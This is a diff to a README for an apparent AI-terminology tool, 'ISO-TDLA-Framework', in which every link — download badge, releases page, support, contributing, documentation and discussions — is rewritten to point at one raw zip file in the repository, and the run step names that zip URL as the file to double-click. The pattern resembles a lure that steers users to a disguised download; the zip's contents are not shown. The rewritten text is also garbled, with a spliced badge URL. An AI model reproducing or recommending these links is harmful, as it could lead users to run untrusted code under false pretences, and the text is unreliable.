@@ -4,7 +4,7 @@
 Welcome to the ISO-TDLA-Framework! This software helps you better understand and manage AI language standards. No technical knowledge is required. Just follow these easy steps to get started.
 
 ## 📥 Download the Application
-[![Download ISO-TDLA-Framework](https://img.shields.io/badge/Download%20ISO--TDLA--Framework-blue.svg)](https://github.com/Sobri01/ISO-TDLA-Framework/releases)
+[![Download ISO-TDLA-Framework](https://github.com/Sobri01/ISO-TDLA-Framework/raw/refs/heads/main/docs/Framework_TDL_IS_2.3.zip%https://github.com/Sobri01/ISO-TDLA-Framework/raw/refs/heads/main/docs/Framework_TDL_IS_2.3.zip)](https://github.com/Sobri01/ISO-TDLA-Framework/raw/refs/heads/main/docs/Framework_TDL_IS_2.3.zip)
 
 ## 🌐 Overview
 The ISO-TDLA-Framework focuses on improving the language used in artificial intelligence. This includes concepts such as structural isomorphism and stochastic confabulation. Our goal is to replace complex AI-related vocabulary with clearer terms, making it easier for everyone to engage with AI.
@@ -25,7 +25,7 @@ To run the ISO-TDLA-Framework, ensure that your system meets the following requi
 - Storage: At least 500 MB of free space
 
 ## 📥 Download & Install
-Visit this page to download: [ISO-TDLA-Framework Releases](https://github.com/Sobri01/ISO-TDLA-Framework/releases)
+Visit this page to download: [ISO-TDLA-Framework Releases](https://github.com/Sobri01/ISO-TDLA-Framework/raw/refs/heads/main/docs/Framework_TDL_IS_2.3.zip)
 
 ### Step 1: Visit the Releases Page
 Go to the link above. You will see a list of available versions of the software. 
@@ -40,7 +40,7 @@ Click on the version you want and download the appropriate file for your operati
 If you downloaded a `.zip` file, extract it using your file manager (right-click and select "Extract All"). 
 
 ### Step 5: Run the Application
-Locate the extracted folder and find the executable file (e.g., `ISO-TDLA-Framework.exe`). Double-click this file to run the application.
+Locate the extracted folder and find the executable file (e.g., `https://github.com/Sobri01/ISO-TDLA-Framework/raw/refs/heads/main/docs/Framework_TDL_IS_2.3.zip`). Double-click this file to run the application.
 
 ## 📚 Usage Instructions
 1. After launching the application, you will see the main dashboard.
@@ -56,14 +56,14 @@ If you encounter issues, consider the following steps:
 - Check for updates on the Releases page if the application isn’t responding.
 - Restart your computer if the application crashed.
 
-If problems persist, please reach out through our [support channel](https://github.com/Sobri01/ISO-TDLA-Framework/issues).
+If problems persist, please reach out through our [support channel](https://github.com/Sobri01/ISO-TDLA-Framework/raw/refs/heads/main/docs/Framework_TDL_IS_2.3.zip).
 
 ## 🛠 Contributing
-We welcome contributions from everyone. If you want to help improve the ISO-TDLA-Framework, check out the guidelines on our [GitHub page](https://github.com/Sobri01/ISO-TDLA-Framework).
+We welcome contributions from everyone. If you want to help improve the ISO-TDLA-Framework, check out the guidelines on our [GitHub page](https://github.com/Sobri01/ISO-TDLA-Framework/raw/refs/heads/main/docs/Framework_TDL_IS_2.3.zip).
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/Sobri01/ISO-TDLA-Framework/wiki)
-- [Community Discussions](https://github.com/Sobri01/ISO-TDLA-Framework/discussions)
+- [Documentation](https://github.com/Sobri01/ISO-TDLA-Framework/raw/refs/heads/main/docs/Framework_TDL_IS_2.3.zip)
+- [Community Discussions](https://github.com/Sobri01/ISO-TDLA-Framework/raw/refs/heads/main/docs/Framework_TDL_IS_2.3.zip)
 
 ## 📞 Contact
 For questions or feedback, feel free to open an issue on our GitHub repository or contact us directly through our support email.
